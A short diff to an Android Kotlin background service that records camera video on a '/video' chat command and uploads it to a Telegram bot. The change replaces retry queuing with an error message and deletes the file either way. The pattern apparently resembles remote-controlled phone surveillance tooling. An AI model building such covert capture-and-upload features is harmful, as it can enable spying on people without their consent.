@@ -214,13 +214,11 @@ class VideoCaptureService : Service() {
                 val caption = "🎥 Video ($durationSec soniya)"
                 val sent = TelegramSender.sendVideo(token, chatId, file.readBytes(), caption)
                 if (!sent) {
-                    // Tarmoq muammosi — PendingQueue'ga qo'sh, keyinroq yuboriladi
-                    PendingQueue.enqueue(this, PendingItem.Video(file.absolutePath, caption))
-                } else {
-                    file.delete()
+                    TelegramSender.sendMessage(token, chatId,
+                        "⚠️ Video yuborishda xatolik (tarmoq muammosi). /video buyrug'ini qayta yuboring.")
                 }
+                file.delete()
             } else if (file != null && file.exists()) {
-                // Fayl juda kichik yoki bo'sh — xabar yubor
                 if (token.isNotEmpty() && chatId.isNotEmpty()) {
                     TelegramSender.sendMessage(token, chatId,
                         "⚠️ Video fayl juda kichik (${file.length()} bayt). Kamera ochilmagan bo'lishi mumkin.")
